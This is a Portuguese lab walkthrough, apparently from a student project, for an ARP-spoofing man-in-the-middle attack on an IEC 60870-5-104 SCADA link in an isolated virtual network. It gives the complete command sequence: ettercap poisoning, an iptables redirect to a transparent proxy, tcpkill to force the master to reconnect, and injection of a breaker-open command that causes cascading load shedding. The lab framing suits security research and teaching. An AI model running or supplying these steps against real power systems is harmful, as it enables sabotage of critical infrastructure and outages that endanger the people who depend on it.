# Caso 1 — Ataque de ARP spoofing (cascata IEC 104)

Passo a passo do ataque *man-in-the-middle* on-path contra o enlace IEC 60870-5-104
entre o centro de controle (master) e a usina térmica (slave). O ataque envenena o
ARP do par, intercepta a conexão de forma transparente e injeta um comando de abertura
de disjuntor que dispara o corte de carga em cascata.

> Ambiente de laboratório isolado (VMware VMnet8, `192.168.21.0/24`). Uso restrito ao
> PFC — rede controlada, sem alvos de terceiros.

---

## Topologia

```
  HOST Windows (.1)                 VM Kali atacante (.21)              VM térmica (.12)
  centro de controle   ──SYN :2404──►  [ ARP poisoning ]   ──►   slave IEC 104 :2404
  (master IEC104)       ◄── telemetria ─ proxy mitm.py ─ telemetria ──►
```

| Papel                         | Host           | Porta       |
|-------------------------------|----------------|-------------|
| Centro de controle (master)   | `192.168.21.1` (host) | — |
| Usina térmica (slave, alvo)   | `192.168.21.12` | `2404/tcp` |
| Kali atacante (`ldpkali`)     | `192.168.21.21` | gateway `192.168.21.2` |

O Kali diz ao master (`.1`) que o `.12` está no MAC do Kali, e ao slave (`.12`) que o
`.1` está no MAC do Kali. O tráfego IEC 104 passa a atravessar o atacante, que o entrega
ao proxy local via `iptables REDIRECT` + `SO_ORIGINAL_DST`.

---

## Pré-requisitos

- Simulação de pé: **coordenador + centro de controle + SCADA-LTS** no host e as **RTUs**
  nas VMs (inclusive a térmica em `192.168.21.12:2404`).
- Projeto copiado para o Kali em `~/PFC_Pinheiro_Rabelo`.
- O **Caso 1 usa só a biblioteca padrão do Python** — não precisa do `venv`/`asyncua`
  (isso é só o Caso 2).
- Ferramentas no Kali: `ettercap-text-only`, `iptables`, e (opcional) `dsniff` para o
  `tcpkill`. Instalar o que faltar:

```bash
sudo apt-get install -y ettercap-text-only dsniff conntrack
```

Confirme a interface e os vizinhos (anote o nome da interface — normalmente `eth0`):

```bash
ip -4 a; ip neigh
```

Confirme que a térmica responde:

```bash
nc -vz 192.168.21.12 2404
```

---

## Execução (tudo na VM Kali, como root)

### 1. Habilitar o repasse de pacotes
Sem isso você **derruba** a conexão em vez de interceptá-la.

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

### 2. Redirecionar as conexões IEC 104 interceptadas para o proxy local

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 2404 -j REDIRECT --to-port 2404
```

### 3. Envenenar o ARP do par master ↔ térmica
Deixe este terminal **aberto** (ele mantém o envenenamento):

```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.21.1// /192.168.21.12//
```

### 4. Subir o proxy transparente (em outro terminal)

```bash
cd ~/PFC_Pinheiro_Rabelo && python3 mitm.py --proto iec104 --transparent
```

### 5. Forçar a reconexão automática do master
Num ataque real ninguém reinicia nada no operador: o atacante **derruba a sessão atual**
e a reconexão automática do master (`retry_delay`, `max_retries: -1`) reabre a conexão
— agora pelo proxy. Dispare **uma** queda:

```bash
sudo timeout 3 tcpkill -i eth0 host 192.168.21.12 and tcp port 2404
```

> O `timeout 3` é essencial: o `tcpkill` manda RST em todo pacote que casa o filtro; se
> ficar rodando, mata também a reconexão. Três segundos derrubam a sessão e saem do
> caminho.
>
> Alternativa sem o `dsniff`, usando só o conntrack do Kali:
>
> ```bash
> sudo conntrack -D -p tcp --dport 2404
> ```

### 6. Injetar o comando de abertura do disjuntor
Aguarde o `mitm>` deixar de exibir "sem conexão ativa" (poucos segundos) e injete o
comando único `C_SC_NA_1` no IOA 100:

```
s command 100 off
```

Efeito: disjuntor da usina abre → a térmica cai → a UFLS corta **industrial** e **centro**
em cascata. O **hospital** segura (a hidro de 45 MW sustenta os 20 MW residuais e a
frequência recupera antes do 3º estágio) — desfecho realista mantido de propósito.

---

## Por que a reconexão é necessária (fundamento)

A regra `iptables -t nat ... REDIRECT` age na cadeia **nat/PREROUTING**, consultada pelo
netfilter apenas no **primeiro pacote de uma conexão nova** (estado `NEW` do conntrack).
Uma sessão IEC 104 **já estabelecida** antes do envenenamento só é **repassada**
(`ip_forward`), nunca redirecionada ao proxy — o atacante vê os bytes, mas o `mitm.py`
não está no caminho dela, então não há como injetar. Por isso o handshake TCP precisa
ocorrer com a regra REDIRECT + o ARP poisoning **já ativos**; derrubar a sessão e deixar
o master reconectar resolve isso de forma automática.

**Regra de ouro da ordem:** Kali on-path primeiro (passos 1–4), reconexão depois (passo 5).

---

## Verificação

Está on-path se o MAC da *outra* vítima aparecer como o do Kali (`00:0c:29:db:fa:bc`):

```bash
ip neigh | grep -E "192.168.21.(1|12)"
```

No Wireshark (filtro `104apci`) o comando injetado aparece como
`ACT → CON → TERM` — é o print da figura do ataque para o Cap. 5.

---

## Limpeza (restaurar a rede)

1. No terminal do `ettercap`: `q` (ele reenvia o ARP correto às vítimas ao sair).
2. Remover a regra e desligar o repasse:

```bash
sudo iptables -t nat -D PREROUTING -p tcp --dport 2404 -j REDIRECT --to-port 2404
```

```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

---

## Resumo do fluxo

| # | Passo | Comando-chave |
|---|-------|---------------|
| 1 | Repasse de pacotes | `sysctl -w net.ipv4.ip_forward=1` |
| 2 | Redirecionar p/ o proxy | `iptables -t nat -A PREROUTING -p tcp --dport 2404 -j REDIRECT --to-port 2404` |
| 3 | ARP poisoning | `ettercap -T -q -i eth0 -M arp:remote /192.168.21.1// /192.168.21.12//` |
| 4 | Proxy transparente | `python3 mitm.py --proto iec104 --transparent` |
| 5 | Forçar reconexão | `timeout 3 tcpkill -i eth0 host 192.168.21.12 and tcp port 2404` |
| 6 | Injetar comando | `s command 100 off` (no `mitm>`) |
